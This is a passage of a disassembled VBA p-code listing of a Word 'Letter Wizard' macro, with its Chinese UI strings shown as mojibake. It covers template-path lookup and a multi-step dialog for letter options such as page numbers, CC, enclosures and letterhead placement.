' 	St kGallery$ 
' Line #187:
' 	LitStr 0x0000 ""
' 	St kErrBadDoc$ 
' Line #188:
' 	LitStr 0x0000 ""
' 	St kTip$ 
' Line #189:
' 	LitStr 0x0000 ""
' 	St kLetterPath$ 
' Line #190:
' 	LitStr 0x0000 ""
' 	St kLettersDir$ 
' Line #191:
' 	LitStr 0x0000 ""
' 	St kLongLettersDir$ 
' Line #192:
' 	LitStr 0x0000 ""
' 	St kSetupDialog$ 
' Line #193:
' 	LitStr 0x0000 ""
' 	St kCreatingDoc$ 
' Line #194:
' 	LitStr 0x0000 ""
' 	St kSaveSettings$ 
' Line #195:
' 	LitStr 0x0000 ""
' 	St kRstSettings$ 
' Line #196:
' 	LitStr 0x0000 ""
' 	St kRstStylsheet$ 
' Line #197:
' 	LitStr 0x0000 ""
' 	St kLookingForLetters$ 
' Line #198:
' 	LitStr 0x0000 ""
' 	St kLoadingLetterDetails$ 
' Line #199:
' 	LitStr 0x0000 ""
' 	St kLookingFor$ 
' Line #200:
' 	LitStr 0x0000 ""
' 	St kEnterRecipientAddress$ 
' Line #201:
' 	LitStr 0x0000 ""
' 	St chQuote$ 
' Line #202:
' 	LitStr 0x0000 ""
' 	St kAddressATEntry$ 
' Line #203:
' 	LitStr 0x0000 ""
' 	St Dot_$ 
' Line #204:
' 	LitStr 0x0000 ""
' 	St Letter_$ 
' Line #205:
' 	LitStr 0x0000 ""
' 	St kRE$ 
' Line #206:
' 	LitStr 0x0000 ""
' 	St kAccountID$ 
' Line #207:
' 	LitStr 0x0000 ""
' 	St kDear$ 
' Line #208:
' 	LitStr 0x0000 ""
' 	St kRecipient$ 
' Line #209:
' 	LitStr 0x0000 ""
' 	St kTypeHere$ 
' Line #210:
' 	LitStr 0x0000 ""
' 	St TPath$ 
' Line #211:
' 	LitStr 0x0000 ""
' 	St kName$ 
' Line #212:
' 	LitStr 0x0000 ""
' 	St kClosePersonal$ 
' Line #213:
' 	LitStr 0x0000 ""
' 	St kCloseBusiness$ 
' Line #214:
' 	LitStr 0x0000 ""
' 	St kWritersInitials$ 
' Line #215:
' 	LitStr 0x0000 ""
' 	St kTypistsInitials$ 
' Line #216:
' 	LitStr 0x0000 ""
' 	St kCC$ 
' Line #217:
' 	LitStr 0x0000 ""
' 	St kNames$ 
' Line #218:
' 	LitStr 0x0000 ""
' 	St kEnclosures$ 
' Line #219:
' 	LitStr 0x0000 ""
' 	St kNumber$ 
' Line #220:
' 	LitStr 0x0000 ""
' 	St kAttachments$ 
' Line #221:
' 	LitStr 0x0000 ""
' 	St kFormalDateFormat$ 
' Line #222:
' 	LitStr 0x0000 ""
' 	St kPage$ 
' Line #223:
' 	LitStr 0x0000 ""
' 	St kEmptyMacro$ 
' Line #224:
' 	LitStr 0x0000 ""
' 	St kInsertAddress$ 
' Line #225:
' 	LitStr 0x0000 ""
' 	St kMacroButton$ 
' Line #226:
' 	LitStr 0x0000 ""
' 	St kErrLetterNotFound$ 
' Line #227:
' 	LitStr 0x0000 ""
' 	St kErrThatLetterNotFound$ 
' Line #228:
' 	LitStr 0x0000 ""
' 	St kErrStyleNotFound1$ 
' Line #229:
' 	LitStr 0x0000 ""
' 	St kErrStyleNotFound2$ 
' Line #230:
' 	LitStr 0x0000 ""
' 	St kErrCannotCreate1$ 
' Line #231:
' 	LitStr 0x0000 ""
' 	St kErrCannotCreate2$ 
' Line #232:
' 	LitStr 0x0000 ""
' 	St kTypeCompanyName$ 
' Line #233:
' 	LitStr 0x0000 ""
' 	St kFntArial$ 
' Line #234:
' 	LitStr 0x0000 ""
' 	St kFntWndngs$ 
' Line #235:
' 	LitStr 0x0000 ""
' 	St kDfltPageNum$ 
' Line #236:
' 	LitStr 0x0000 ""
' 	St pt90_$ 
' Line #237:
' 	LitStr 0x0000 ""
' 	St pt72_$ 
' Line #238:
' 	LitStr 0x0000 ""
' 	St pt216_$ 
' Line #239:
' 	LitStr 0x0000 ""
' 	St kFtrDist1$ 
' Line #240:
' 	LitStr 0x0000 ""
' 	St kFtrDist2$ 
' Line #241:
' 	LitStr 0x0000 ""
' 	St kErrMaxLines$ 
' Line #242:
' 	LitStr 0x0000 ""
' 	St cntmplet$ 
' Line #243:
' 	LitStr 0x0000 ""
' 	St proflett$ 
' Line #244:
' 	LitStr 0x0000 ""
' 	St eleglett$ 
' Line #245:
' 	LitStr 0x0000 ""
' 	St kStyCmpnyName$ 
' Line #246:
' 	LitStr 0x0000 ""
' 	St kStyBodyText$ 
' Line #247:
' 	LitStr 0x0000 ""
' 	St kStyRetAddr$ 
' Line #248:
' 	LitStr 0x0000 ""
' 	St kStyCC$ 
' Line #249:
' 	LitStr 0x0000 ""
' 	St kStyEncl$ 
' Line #250:
' 	LitStr 0x0000 ""
' 	St kStySigName$ 
' Line #251:
' 	LitStr 0x0000 ""
' 	St kStySal$ 
' Line #252:
' 	LitStr 0x0000 ""
' 	St kStySubjLine$ 
' Line #253:
' 	LitStr 0x0000 ""
' 	St kStyDate$ 
' Line #254:
' 	LitStr 0x0000 ""
' 	St kStyInsideAddr$ 
' Line #255:
' 	LitStr 0x0000 ""
' 	St kStyRefIntls$ 
' Line #256:
' Line #257:
' 	LitStr 0x0008 "letters\"
' 	St kLettersDir$ 
' 	QuoteRem 0x0020 0x001F "letters subdirectory - localize"
' Line #258:
' 	LitStr 0x0009 "«H¥ó¶Ç¯u\"
' 	St kLongLettersDir$ 
' Line #259:
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall WaitCursor 0x0001 
' 	QuoteRem 0x001C 0x001B "This'll take a little while"
' Line #260:
' 	ArgsCall InitStrings 0x0000 
' Line #261:
' 	QuoteRem 0x0004 0x0069 "Get the templates directory. The templates are supposed to be in the same directory as that of the wizard"
' Line #262:
' 	Dim 
' 	VarDefn TempDlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileTemplates 0x0001 
' 	Set TempDlg 
' Line #263:
' 	Ld TempDlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileTemplates 0x0001 
' Line #264:
' 	Ld TempDlg 
' 	MemLd Template 
' 	St p$ 
' Line #265:
' 	Ld p$ 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' 	QuoteRem 0x0014 0x0058 "user might be creating a new template. Look at the default directory for style templates"
' Line #266:
' 	Ld StrWizardPath 
' 	St TPath$ 
' Line #267:
' 	Ld TPath$ 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [Right$] 0x0002 
' 	LitStr 0x0001 "\"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld TPath$ 
' 	LitStr 0x0001 "\"
' 	Add 
' 	St TPath$ 
' 	EndIf 
' Line #268:
' 	Ld TPath$ 
' 	Ld kLongLettersDir$ 
' 	Add 
' 	LitStr 0x0001 "*"
' 	Add 
' 	Ld Dot_$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemLd [Files$] 0x0001 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #269:
' 	Ld TPath$ 
' 	Ld kLettersDir$ 
' 	Add 
' 	St TPath$ 
' 	QuoteRem 0x002B 0x000A "short name"
' Line #270:
' 	ElseBlock 
' Line #271:
' 	Ld TPath$ 
' 	Ld kLongLettersDir$ 
' 	Add 
' 	St TPath$ 
' Line #272:
' 	EndIfBlock 
' Line #273:
' 	ElseBlock 
' Line #274:
' 	Ld p$ 
' 	LitDI2 0x0005 
' 	Ld WordBasic 
' 	ArgsMemLd [FileNameInfo$] 0x0002 
' 	St TPath$ 
' Line #275:
' 	EndIfBlock 
' Line #276:
' Line #277:
' 	QuoteRem 0x0004 0x0040 "TPath$ = "C:\Program Files\Microsoft Office\Templates\«H¥ó¶Ç¯u\""
' Line #278:
' 	Rem 0x0024 " Names of templates for style merges"
' Line #279:
' 	Ld TPath$ 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [Right$] 0x0002 
' 	LitStr 0x0001 "\"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld TPath$ 
' 	LitStr 0x0001 "\"
' 	Add 
' 	St TPath$ 
' 	EndIf 
' Line #280:
' 	Ld TPath$ 
' 	LitStr 0x000E "²{¥N¦¡«H¥ó.dot"
' 	Add 
' 	St cntmplet$ 
' Line #281:
' 	Ld cntmplet$ 
' 	Ld WordBasic 
' 	ArgsMemLd [Files$] 0x0001 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld TPath$ 
' 	LitStr 0x000B "letter1.dot"
' 	Add 
' 	St cntmplet$ 
' 	EndIf 
' Line #282:
' Line #283:
' 	Ld TPath$ 
' 	LitStr 0x000E "±M·~¦¡«H¥ó.dot"
' 	Add 
' 	St proflett$ 
' Line #284:
' 	Ld proflett$ 
' 	Ld WordBasic 
' 	ArgsMemLd [Files$] 0x0001 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld TPath$ 
' 	LitStr 0x000B "letter3.dot"
' 	Add 
' 	St proflett$ 
' 	EndIf 
' Line #285:
' Line #286:
' 	Ld TPath$ 
' 	LitStr 0x000E "¨å¶®¦¡«H¥ó.dot"
' 	Add 
' 	St eleglett$ 
' Line #287:
' 	Ld eleglett$ 
' 	Ld WordBasic 
' 	ArgsMemLd [Files$] 0x0001 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld TPath$ 
' 	LitStr 0x000B "letter2.dot"
' 	Add 
' 	St eleglett$ 
' 	EndIf 
' Line #288:
' Line #289:
' 	LitR8 0x0000 0x0000 0x0000 0x3FF4 
' 	St rtDistToLftDist 
' 	QuoteRem 0x001B 0x0025 "Used in DateTabPlace$ in CreateLetter"
' Line #290:
' 	ArgsCall VerifyEnvirons 0x0000 
' Line #291:
' 	ArgsCall GetPrewrittenDetails 0x0000 
' Line #292:
' 	Ld kSetupDialog$ 
' 	Ld WordBasic 
' 	ArgsMemCall PrintStatusBar 0x0001 
' Line #293:
' Line #294:
' 	LitDI2 0x022E 
' 	LitDI2 0x00FC 
' 	Ld kWizname$ 
' 	LitStr 0x0016 "StartWizard.DlgControl"
' 	Ld WordBasic 
' 	ArgsMemCall BeginDialog 0x0004 
' Line #295:
' Line #296:
' 	QuoteRem 0x0004 0x0022 "General controls, 0-7 (hands off!)"
' Line #297:
' 	LitDI2 0x0002 
' 	LitDI2 0x00D8 
' 	LitDI2 0x01F4 
' 	LitDI2 0x000B 
' 	LitStr 0x0007 "LinePic"
' 	LitDI2 0x0001 
' 	LitStr 0x0008 "LinePicA"
' 	Ld WordBasic 
' 	ArgsMemCall Picture 0x0007 
' 	QuoteRem 0x0044 0x001D "Workaround odd picture bug --"
' Line #298:
' 	LitDI2 0x0082 
' 	LitDI2 0x00D8 
' 	LitDI2 0x01A0 
' 	LitDI2 0x000B 
' 	LitStr 0x0007 "LinePic"
' 	LitDI2 0x0001 
' 	LitStr 0x0008 "LinePicB"
' 	Ld WordBasic 
' 	ArgsMemCall Picture 0x0007 
' 	QuoteRem 0x0046 0x0022 " use two copies to go entire width"
' Line #299:
' 	LitDI2 0x0029 
' 	LitDI2 0x00B0 
' 	LitDI2 0x0049 
' 	LitDI2 0x0015 
' 	Ld WordBasic 
' 	ArgsMemCall OKButton 0x0004 
' 	QuoteRem 0x002C 0x0036 "2 -- Will never be seen! (o.w. it'd always be default)"
' Line #300:
' 	LitDI2 0x0093 
' 	LitDI2 0x00AA 
' 	LitDI2 0x004B 
' 	LitDI2 0x0014 
' 	LitStr 0x0008 "´£¥Ü(&H)"
' 	Ld WordBasic 
' 	ArgsMemCall PushButton 0x0005 
' 	QuoteRem 0x003C 0x0001 "3"
' Line #301:
' 	LitDI2 0x00CD 
' 	LitDI2 0x00E4 
' 	LitDI2 0x004B 
' 	LitDI2 0x0013 
' 	Ld WordBasic 
' 	ArgsMemCall CancelButton 0x0004 
' 	QuoteRem 0x0030 0x0001 "4"
' Line #302:
' 	LitDI2 0x011E 
' 	LitDI2 0x00E4 
' 	LitDI2 0x005E 
' 	LitDI2 0x0013 
' 	LitStr 0x000B "<¤W¤@¨B(&B)"
' 	Ld WordBasic 
' 	ArgsMemCall PushButton 0x0005 
' 	QuoteRem 0x0040 0x0001 "5"
' Line #303:
' 	LitDI2 0x017C 
' 	LitDI2 0x00E4 
' 	LitDI2 0x005E 
' 	LitDI2 0x0013 
' 	LitStr 0x000B "¤U¤@¨B(&N)>"
' 	Ld WordBasic 
' 	ArgsMemCall PushButton 0x0005 
' 	QuoteRem 0x0040 0x0001 "6"
' Line #304:
' 	LitDI2 0x01DC 
' 	LitDI2 0x00E4 
' 	LitDI2 0x004B 
' 	LitDI2 0x0013 
' 	LitStr 0x0008 "§¹¦¨(&F)"
' 	Ld WordBasic 
' 	ArgsMemCall PushButton 0x0005 
' 	QuoteRem 0x003C 0x0001 "7"
' Line #305:
' 	LitDI2 0x0007 
' 	LitDI2 0x0003 
' 	LitDI2 0x00F0 
' 	LitDI2 0x00CE 
' 	LitStr 0x0007 "Preview"
' 	Ld WordBasic 
' 	ArgsMemCall FilePreview 0x0005 
' 	QuoteRem 0x0038 0x0001 "8"
' Line #306:
' 	LitDI2 0x0009 
' 	LitDI2 0x0000 
' 	ArgsSt StateItems__ 0x0001 
' 	QuoteRem 0x001C 0x002E "Number of general (state-independent) controls"
' Line #307:
' Line #308:
' 	QuoteRem 0x0004 0x0024 "%% Wizard-specific states go here %%"
' Line #309:
' 	QuoteRem 0x0004 0x0007 "State 1"
' Line #310:
' 	LitDI2 0x0103 
' 	LitDI2 0x0009 
' 	LitDI2 0x00E5 
' 	LitDI2 0x0013 
' 	LitStr 0x0022 "ºëÆF¥i¥H³]­p¥X¼ÆºØ«¬¦¡ªº­^¤å«H¥ó¡C"
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0005 
' Line #311:
' 	LitDI2 0x010D 
' 	LitDI2 0x002D 
' 	LitDI2 0x0068 
' 	LitDI2 0x000D 
' 	LitStr 0x0013 "±z·Q­n¨º¤@Ãþªº«H¥ó?"
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0005 
' Line #312:
' 	LitStr 0x000C "LetterMethod"
' 	Ld WordBasic 
' 	ArgsMemCall OptionGroup 0x0001 
' Line #313:
' 	LitDI2 0x0122 
' 	LitDI2 0x0054 
' 	LitDI2 0x00D7 
' 	LitDI2 0x0010 
' 	LitStr 0x0010 "¼¶¼g°Ó·~«H¥ó(&B)"
' 	LitStr 0x0006 "optlm2"
' 	Ld WordBasic 
' 	ArgsMemCall OptionButton 0x0006 
' Line #314:
' 	LitDI2 0x0122 
' 	LitDI2 0x0068 
' 	LitDI2 0x00D7 
' 	LitDI2 0x0010 
' 	LitStr 0x0010 "¼¶¼g¨p¤H«H¥ó(&P)"
' 	LitStr 0x0006 "optlm3"
' 	Ld WordBasic 
' 	ArgsMemCall OptionButton 0x0006 
' Line #315:
' 	LitDI2 0x0133 
' 	LitDI2 0x003C 
' 	LitDI2 0x00D0 
' 	LitDI2 0x0010 
' 	LitStr 0x0000 ""
' 	LitStr 0x0005 "Text1"
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0006 
' 	QuoteRem 0x0035 0x000B "Placeholder"
' Line #316:
' 	LitDI2 0x010A 
' 	LitDI2 0x0091 
' 	LitDI2 0x0028 
' 	LitDI2 0x000D 
' 	Ld kTip$ 
' 	LitStr 0x0004 "tip1"
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0006 
' Line #317:
' 	LitDI2 0x013B 
' 	LitDI2 0x0091 
' 	LitDI2 0x00D0 
' 	LitDI2 0x0042 
' 	LitStr 0x0001 " "
' 	LitStr 0x0008 "tip1text"
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0006 
' Line #318:
' 	LitDI2 0x0008 
' 	ArgsCall ItemsInState 0x0001 
' 	QuoteRem 0x0018 0x0018 "Number of items in state"
' Line #319:
' Line #320:
' 	QuoteRem 0x0004 0x0017 "State 2: Letter options"
' Line #321:
' 	LitDI2 0x0106 
' 	LitDI2 0x0014 
' 	LitDI2 0x010F 
' 	LitDI2 0x0013 
' 	LitStr 0x0019 "±z·Q±N­þ¨Ç¶µ¥Ø¥[¤J«H¥ó¤¤?"
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0005 
' Line #322:
' 	LitDI2 0x011E 
' 	LitDI2 0x0032 
' 	LitDI2 0x00D6 
' 	LitDI2 0x0010 
' 	LitStr 0x0008 "­¶½X(&P)"
' 	LitStr 0x0009 "chkloPage"
' 	Ld WordBasic 
' 	ArgsMemCall CheckBox 0x0006 
' Line #323:
' 	LitDI2 0x011E 
' 	LitDI2 0x0046 
' 	LitDI2 0x00D6 
' 	LitDI2 0x0010 
' 	LitStr 0x0008 "¤é´Á(&D)"
' 	LitStr 0x0009 "chkloDate"
' 	Ld WordBasic 
' 	ArgsMemCall CheckBox 0x0006 
' Line #324:
' 	LitDI2 0x011E 
' 	LitDI2 0x005A 
' 	LitDI2 0x00FB 
' 	LitDI2 0x0010 
' 	LitStr 0x001C "¹q¤l¶l¥ó±b¸¹©Î¤å¥óÃÑ§O½X(&I)"
' 	LitStr 0x0007 "chkloID"
' 	Ld WordBasic 
' 	ArgsMemCall CheckBox 0x0006 
' Line #325:
' 	LitDI2 0x011E 
' 	LitDI2 0x006E 
' 	LitDI2 0x00D6 
' 	LitDI2 0x0010 
' 	LitStr 0x000E "¼g«HªÌÃ±¦W(&W)"
' 	LitStr 0x0013 "chkloWriterInitials"
' 	Ld WordBasic 
' 	ArgsMemCall CheckBox 0x0006 
' Line #326:
' 	LitDI2 0x011E 
' 	LitDI2 0x0082 
' 	LitDI2 0x00D6 
' 	LitDI2 0x0010 
' 	LitStr 0x000E "¥´¦rªÌÃ±¦W(&T)"
' 	LitStr 0x0013 "chkloTypistInitials"
' 	Ld WordBasic 
' 	ArgsMemCall CheckBox 0x0006 
' Line #327:
' 	LitDI2 0x011E 
' 	LitDI2 0x0096 
' 	LitDI2 0x00D6 
' 	LitDI2 0x0010 
' 	LitStr 0x0008 "°Æ¥»(&C)"
' 	LitStr 0x0007 "chkloCC"
' 	Ld WordBasic 
' 	ArgsMemCall CheckBox 0x0006 
' Line #328:
' 	LitDI2 0x011E 
' 	LitDI2 0x00AA 
' 	LitDI2 0x00D6 
' 	LitDI2 0x0010 
' 	LitStr 0x0008 "ÀH¨ç(&E)"
' 	LitStr 0x000F "chkloEnclosures"
' 	Ld WordBasic 
' 	ArgsMemCall CheckBox 0x0006 
' Line #329:
' 	LitDI2 0x011E 
' 	LitDI2 0x00BE 
' 	LitDI2 0x00D6 
' 	LitDI2 0x0010 
' 	LitStr 0x0008 "ªþ¥ó(&A)"
' 	LitStr 0x0010 "chkloAttachments"
' 	Ld WordBasic 
' 	ArgsMemCall CheckBox 0x0006 
' Line #330:
' 	LitDI2 0x0009 
' 	ArgsCall ItemsInState 0x0001 
' Line #331:
' Line #332:
' 	QuoteRem 0x0004 0x0007 "State 3"
' Line #333:
' 	LitDI2 0x0115 
' 	LitDI2 0x002C 
' 	LitDI2 0x00E6 
' 	LitDI2 0x0012 
' 	LitStr 0x0017 "±z­n¿ï¨ú¦óºØ®æ¦¡ªº«H¥ó?"
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0005 
' Line #334:
' 	LitStr 0x000D "UseLetterhead"
' 	Ld WordBasic 
' 	ArgsMemCall OptionGroup 0x0001 
' Line #335:
' 	LitDI2 0x012A 
' 	LitDI2 0x0044 
' 	LitDI2 0x00BD 
' 	LitDI2 0x0010 
' 	LitStr 0x0010 "§t¼ÐÀYªº«H¥ó(&L)"
' 	LitStr 0x000D "LetterHeadYes"
' 	Ld WordBasic 
' 	ArgsMemCall OptionButton 0x0006 
' Line #336:
' 	LitDI2 0x012A 
' 	LitDI2 0x0058 
' 	LitDI2 0x00BD 
' 	LitDI2 0x0010 
' 	LitStr 0x0012 "¤£§t¼ÐÀYªº«H¥ó(&P)"
' 	LitStr 0x000C "LetterHeadNo"
' 	Ld WordBasic 
' 	ArgsMemCall OptionButton 0x0006 
' Line #337:
' 	LitDI2 0x0004 
' 	ArgsCall ItemsInState 0x0001 
' Line #338:
' Line #339:
' 	QuoteRem 0x0004 0x0007 "State 4"
' Line #340:
' 	LitDI2 0x010B 
' 	LitDI2 0x0007 
' 	LitDI2 0x0111 
' 	LitDI2 0x0011 
' 	LitStr 0x001F "±z­n±N«H¥ó¼ÐÀY³]­p©ñ¦b­¶­±¦ó³B?"
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0005 
' Line #341:
' 	LitStr 0x0012 "LetterHeadPosition"
' 	Ld WordBasic 
' 	ArgsMemCall OptionGroup 0x0001 
' Line #342:
' 	LitDI2 0x011D 
' 	LitDI2 0x001E 
' 	LitDI2 0x0068 
' 	LitDI2 0x0010 
' 	LitStr 0x0008 "¾a¤W(&T)"
' 	LitStr 0x0008 "AtTheTop"
' 	Ld WordBasic 
' 	ArgsMemCall OptionButton 0x0006 
' Line #343:
' 	LitDI2 0x011D 
' 	LitDI2 0x0032 
' 	LitDI2 0x006D 
' 	LitDI2 0x0010 
' 	LitStr 0x0008 "¾a¥ª(&L)"
' 	LitStr 0x0009 "OnTheLeft"
' 	Ld WordBasic 
' 	ArgsMemCall OptionButton 0x0006 
' Line #344:
' 	LitDI2 0x011D 
' 	LitDI2 0x0046 
' 	LitDI2 0x0077 
' 	LitDI2 0x0010 
' 	LitStr 0x0008 "¾a¥k(&R)"
' 	LitStr 0x000A "OnTheRight"
' 	Ld WordBasic 
' 	ArgsMemCall OptionButton 0x0006 
' Line #345:
' 	LitDI2 0x010B 
' 	LitDI2 0x006B 
' 	LitDI2 0x0106 
' 	LitDI2 0x0011 
' 	LitStr 0x001F "«H¥ó¼ÐÀY³]­p»Ý­n¦h¤jªº¶¡¶Z(&S)?"
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0005 
' Line #346:
' 	LitDI2 0x011E 
' 	LitDI2 0x007D 
' 	LitDI2 0x0041 
' 	LitDI2 0x0012 
' 	LitStr 0x0013 "textLetterheadSpace"
' 	Ld WordBasic 
' 	ArgsMemCall TextBox 0x0005 
' Line #347:
' 	LitDI2 0x0105 
' 	LitDI2 0x00AC 
' 	LitDI2 0x0028 
' 	LitDI2 0x000D 
' 	Ld kTip$ 
' 	LitStr 0x0004 "tip5"
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0006 
' Line #348:
' 	LitDI2 0x0132 
' 	LitDI2 0x00AC 
' 	LitDI2 0x00DC 
' 	LitDI2 0x0027 
' 	LitStr 0x0001 " "
' 	LitStr 0x0008 "tip5text"
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0006 
' Line #349:
' 	LitDI2 0x0009 
' 	ArgsCall ItemsInState 0x0001 
' Line #350:
' Line #351:
' 	QuoteRem 0x0004 0x0007 "State 5"
' Line #352:
' 	LitDI2 0x0109 
' 	LitDI2 0x0009 
' 	LitDI2 0x0118 
' 	LitDI2 0x000C 
' 	LitStr 0x0023 "¿é¤J¦¬«H¤H¸ê®Æ©Î¥Ñ³q°T¿ý¤¤¿ï¨ú(&T):"
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0005 
' Line #353:
' 	LitDI2 0x0109 
' 	LitDI2 0x002E 
' 	LitDI2 0x0102 
' 	LitDI2 0x0043 
' 	LitStr 0x0014 "textRecipientAddress"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall TextBox 0x0006 
' Line #354:
' 	LitDI2 0x0109 
' 	LitDI2 0x0073 
' 	LitDI2 0x0073 
' 	LitDI2 0x000C 
' 	LitStr 0x000F "±H«H¤H¦a§}(&Y):"
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0005 
' Line #355:
' 	LitDI2 0x0109 
' 	LitDI2 0x0098 
' 	LitDI2 0x0102 
' 	LitDI2 0x0038 
' 	LitStr 0x0011 "textReturnAddress"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall TextBox 0x0006 
' Line #356:
' 	LitDI2 0x018E 
' 	LitDI2 0x0018 
' 	LitDI2 0x007F 
' 	LitDI2 0x0015 
' 	LitStr 0x000D "³q°T¿ý(&A)..."
' 	LitStr 0x0005 "Push1"
' 	Ld WordBasic 
' 	ArgsMemCall PushButton 0x0006 
' 	QuoteRem 0x0048 0x0002 "43"
' Line #357:
' 	LitDI2 0x018E 
' 	LitDI2 0x0081 
' 	LitDI2 0x007F 
' 	LitDI2 0x0015 
' 	LitStr 0x000D "³q°T¿ý(&X)..."
' 	LitStr 0x0005 "Push2"
' 	Ld WordBasic 
' 	ArgsMemCall PushButton 0x0006 
' 	QuoteRem 0x0049 0x0002 "44"
' Line #358:
' 	LitDI2 0x0006 
' 	ArgsCall ItemsInState 0x0001 
' Line #359:
' Line #360:
' 	QuoteRem 0x0004 0x0007 "State 6"
' Line #361:
' 	LitDI2 0x0102 
' 	LitDI2 0x002A 
' 	LitDI2 0x012C 
' 	LitDI2 0x0011 
' 	LitStr 0x0011 "±z·Q¿ï¥Î¦óºØ¼Ë¦¡?"
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0005 
' Line #362:
' 	LitStr 0x0008 "WizStyle"
' 	Ld WordBasic 
' 	ArgsMemCall OptionGroup 0x0001 
' Line #363:
' 	LitDI2 0x0116 
' 	LitDI2 0x0041 
' 	LitDI2 0x00C8 
' 	LitDI2 0x0010 
' 	LitStr 0x000A "¥j¨å¦¡(&C)"
' 	Ld WordBasic 
' 	ArgsMemCall OptionButton 0x0005 
' Line #364:
' 	LitDI2 0x0116 
' 	LitDI2 0x0055 
' 	LitDI2 0x00C8 
' 	LitDI2 0x0010 
' 	LitStr 0x000A "²{¥N¦¡(&O)"
' 	Ld WordBasic 
' 	ArgsMemCall OptionButton 0x0005 
' Line #365:
' 	LitDI2 0x0116 
' 	LitDI2 0x0069 
' 	LitDI2 0x00C8 
' 	LitDI2 0x0010 
' 	LitStr 0x000A "¼Ð·Ç¦¡(&T)"
' 	Ld WordBasic 
' 	ArgsMemCall OptionButton 0x0005 
' Line #366:
' 	LitDI2 0x0005 
' 	ArgsCall ItemsInState 0x0001 
' Line #367:
' Line #368:
' 	QuoteRem 0x0004 0x000F "State 7: Finish"
' Line #369:
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	LitDI2 0x010D 
' 	LitDI2 0x00D7 
' 	LitStr 0x0007 "FlagPic"
' 	LitDI2 0x0001 
' 	LitStr 0x0004 "flag"
' 	Ld WordBasic 
' 	ArgsMemCall Picture 0x0007 
' Line #370:
' 	LitDI2 0x0115 
' 	LitDI2 0x003C 
' 	LitDI2 0x00ED 
' 	LitDI2 0x0014 
' 	LitStr 0x001D "ºëÆF¤w§¹¦¨«Ø¥ß«H¥óªº¸ß°Ý¿ï¶µ!"
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0005 
' Line #371:
' 	LitDI2 0x0121 
' 	LitDI2 0x0067 
' 	LitDI2 0x00D4 
' 	LitDI2 0x000F 
' 	LitStr 0x0019 "«H¥ó«Ø¥ß¤§«á±zÁÙ·Q°µ¤°»ò?"
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0005 
' Line #372:
' 	LitStr 0x000E "HelpOrEnvelope"
' 	Ld WordBasic 
' 	ArgsMemCall OptionGroup 0x0001 
' Line #373:
' 	LitDI2 0x0134 
' 	LitDI2 0x007E 
' 	LitDI2 0x00DE 
' 	LitDI2 0x000E 
' 	LitStr 0x0016 "«Ø¥ß«H«Ê©Î¶l±H¼ÐÅÒ(&C)"
' 	Ld WordBasic 
' 	ArgsMemCall OptionButton 0x0005 
' Line #374:
' 	LitDI2 0x0134 
' 	LitDI2 0x0092 
' 	LitDI2 0x00DE 
' 	LitDI2 0x0010 
' 	LitStr 0x0014 "¥u­nÅã¥Ü«H¥ó§Y¥i(&J)"
' 	Ld WordBasic 
' 	ArgsMemCall OptionButton 0x0005 
' Line #375:
' 	LitDI2 0x0006 
' 	ArgsCall ItemsInState 0x0001 
' 	QuoteRem 0x0017 0x0018 "Number of items in state"
' Line #376:
' 	LitDI2 0x0001 
' 	Ld LastState 
' 	ArgsSt HideFilePreview__ 0x0001 
' Line #377:
' 	Ld WordBasic 
' 	ArgsMemCall EndDialog 0x0000 
' Line #378:
' 	SetStmt 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	MemLd UserDialog 
' 	Set dlg 
' Line #379:
' Line #380:
' 	QuoteRem 0x0004 0x0018 " Set some default values"
' Line #381:
' 	Ld toui 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall ToolsOptionsUserInfo 0x0001 
' Line #382:
' 	LitDI2 0x0000 
' 	St gEnvelopeLabel 
' Line #383:
' Line #384:
' 	QuoteRem 0x0004 0x003B "We're ready (finally!) to throw the wizard onto the screen:"
' Line #385:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemLd UserDialog 0x0001 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #386:
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall WaitCursor 0x0001 
' Line #387:
' 	Ld gDoogie 
' 	ParamNamed BlueScreen 
' 	Ld WordBasic 
' 	ArgsMemCall ToolsOptionsGeneral 0x0001 
' Line #388:
' 	Ld iWorkDoc 
' 	Paren 
' 	Ld WordBasic 
' 	ArgsMemCall WindowList 0x0001 
' 	QuoteRem 0x0028 0x0025 "ensure work doc is in front for tests"
' Line #389:
